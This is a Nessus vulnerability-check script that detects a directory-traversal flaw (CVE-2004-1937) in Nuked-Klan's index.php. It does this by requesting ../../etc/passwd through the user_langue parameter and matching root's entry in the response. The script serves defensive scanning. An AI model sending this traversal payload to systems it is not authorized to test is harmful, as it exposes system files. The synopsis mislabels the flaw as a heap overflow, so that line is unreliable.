#
# (C) Tenable Network Security
#

include( 'compat.inc' );

if (description)
{
  script_id(12202);
  script_version ("$Revision: 1.7 $");
  script_cve_id("CVE-2004-1937");
  script_bugtraq_id(10104);
  script_xref(name:"OSVDB", value:"52890");

  script_name(english:"Nuked-Klan index.php user_langue Parameter Traversal Arbitrary File Access");
  script_summary(english:"Determine if Nuked-klan is vulnerable to a file include attack");

  script_set_attribute(
    attribute:'synopsis',
    value:'The remote service is prone to a heap based buffer overflow.'
  );

  script_set_attribute(
    attribute:'description',
    value:"Nuked-klan is installed on the remote host.

There is a bug in this version which may allow an attacker to include
php files hosted on a third-party website, thus allowing an attacker to
execute arbitrary commands on this host.

Another bug allows an attacker to read arbitrary files on the remote host."
  );

  script_set_attribute(
    attribute:'solution',
    value: "Upgrade Nuked-klan to a version newer than 1.5b"
  );

  script_set_attribute(
    attribute:'see_also',
    value:'http://www.phpsecure.info/v2/tutos/frog/Nuked-KlaN.txt'
  );


  script_set_attribute(
    attribute:'see_also',
    value:'http://marc.info/?l=bugtraq&m=108222826225823&w=2'
  );

  script_set_attribute(
    attribute:'cvss_vector',
    value:'CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P'
  );

  script_end_attributes();

  script_category(ACT_GATHER_INFO);
  script_family(english:"CGI abuses");
  script_copyright(english:"This script is Copyright (C) 2004-2009 Tenable Network Security, Inc.");
  script_dependencie("find_service1.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

foreach d (cgi_dirs())
{
 url = string(d, "/index.php?user_langue=../../../../../../../../../../etc/passwd");
 req = http_get(item:url, port:port);
 buf = http_keepalive_send_recv(port:port, data:req);
 if( buf == NULL ) exit(0);

 if ( egrep(pattern:"root:.*:0:[01]:", string:buf) )
   {
    security_hole(port:port);
    exit(0);
   }
}
